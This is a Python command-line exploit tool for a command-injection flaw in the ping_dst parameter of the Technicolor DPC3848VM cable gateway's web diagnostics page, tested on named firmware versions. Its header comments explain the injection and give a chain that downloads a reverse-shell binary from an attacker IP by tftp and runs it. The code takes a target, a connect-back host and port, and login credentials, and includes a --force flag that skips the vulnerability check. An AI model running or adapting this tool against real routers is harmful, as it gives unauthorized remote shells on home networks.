# Technicolor DPC3848VM DOCSIS 3.0 Gateway RCE vulnerability
# Tested on firmware: dpc3800-v303r2042162-160620a
# The ping function of the router management website does not properly sanitize user-controlled input.
# This can lead to remote code execution since it allows one to send arbitrary commands to be executed by the device.
# The ping function in the diagnostics page is available to authenticated users on the router's management website.
# The "Ping Target IPv4" field has 4 input boxes which allows users to type numbers in each to form an ip address.
# Of note in the post request to this feature is the ping_dst parameter. What if one were to write an arbitrary command
# into that parameter?

# We can reasonably guess that the ping_dst parameter is substituted into a shell command of the
# form: "/bin/sh -c ping {ping_dst}", so if we craft our input carefully we can execute and commands we want.
# An easy way to do this without knowing exactly what the shell command looks like is to use bash command substitution.
# With this in mind it is now simple to craft a malicious POST request that will get us a reverse shell on the device:
# tftp -g -r <rshell> <attacker_ip> && chmod +x <rshell> && ./<rshell>

# Tested on: model="Technicolor DPC3848VM DOCSIS 3.0 Gateway" firmware="dpc3800-v303r2042162-160620a.p7b"
# Tested on: model="Technicolor DPC3848VM DOCSIS 3.0 Gateway" firmware="dpc3800-v303r204318-210209a.p7b"

import argparse
import sys

import colorama
import trio
from loguru import logger

from dpcpwn.dpc import ExploitConfig, check_is_router, run_command

INTRO_TEXT = rf"""
    ██████╗ ██████╗  ██████╗██████╗ ██╗    ██╗███╗   ██╗
    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║    ██║████╗  ██║
    ██║  ██║██████╔╝██║     ██████╔╝██║ █╗ ██║██╔██╗ ██║
    ██║  ██║██╔═══╝ ██║     ██╔═══╝ ██║███╗██║██║╚██╗██║
    ██████╔╝██║     ╚██████╗██║     ╚███╔███╔╝██║ ╚████║
    ╚═════╝ ╚═╝      ╚═════╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
                    {colorama.Style.BRIGHT}DPC3848VM Gateway RCE{colorama.Style.NORMAL}
"""


LOG_LEVEL = "INFO"


def cli():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", type=str, help="The target to exploit")
    parser.add_argument(
        "cmd", type=str, nargs=argparse.REMAINDER, help="A command to run on the target"
    )

    parser.add_argument("--session", type=str, required=False, help="The php session id")
    parser.add_argument(
        "--quiet",
        action="store_true",
        required=False,
        help="Only print error info and command output",
    )

    parser.add_argument("--verbose", action="store_true", required=False, help="Print debug info")
    parser.add_argument(
        "--lhost", type=str, required=True, help="The local hostname to connect back to"
    )

    parser.add_argument(
        "--rport", type=int, default=80, help="The target's router management http server port"
    )

    parser.add_argument(
        "--lport", type=int, default=4444, help="The local host's shell handler port"
    )
    parser.add_argument(
        "--force", action="store_true", help="Disable checking exploitability of target"
    )

    parser.add_argument(
        "--username",
        type=str,
        default="",
        help="The username to login to the router management page",
    )

    parser.add_argument(
        "--password",
        type=str,
        default="",
        help="The password to login to the router management page",
    )

    args = parser.parse_args()

    global LOG_LEVEL
    if args.verbose:
        LOG_LEVEL = "DEBUG"

    if args.quiet:
        LOG_LEVEL = "ERROR"

    logger.remove()
    logger.add(
        sys.stdout,
        level=LOG_LEVEL,
        colorize=True,
        format=(
            f"[<level>{{level}}</level>]: {colorama.Style.BRIGHT}{{message}}{colorama.Style.NORMAL}"
        ),
    )

    logger.debug("Verbose logging enabled")

    async def run_exploit():
        if not args.quiet:
            print(_colorize_logo(INTRO_TEXT))

        try:
            if not args.force:
                logger.info("Checking if target is vulnerable...")
                if not await check_is_router(args.target, args.rport):
                    logger.error("Target is not vulnerable, pass in --force to skip this check")
                    return
                else:
                    logger.success("Router is vulnerable")

            if isinstance(args.cmd, list):
                args.cmd = " ".join(args.cmd)

            config = ExploitConfig(
                local_host=args.lhost,
                local_port=args.lport,
                remote_host=args.target,
                remote_port=args.rport,
            )

            output = await run_command(
                args.cmd,
                config,
                username=args.username,
                password=args.password,
                session_id=args.session,
            )

            if output is not None:
                logger.success("Output:")
                print(output)
            else:
                logger.warning("Operation timed out")
        except Exception as e:
            logger.exception(f"Error: {e}")

    trio.run(run_exploit)


def _colorize_logo(text):
    color_map = {
        "█": colorama.Style.BRIGHT + colorama.Fore.RED,
        "╗": colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        "╔": colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        "╝": colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        "╚": colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        "║": colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        "═": colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
    }

    colorized = ""
    for c in text:
        if c in color_map:
            colorized += color_map[c] + c + colorama.Fore.WHITE
        else:
            colorized += c

    return colorized
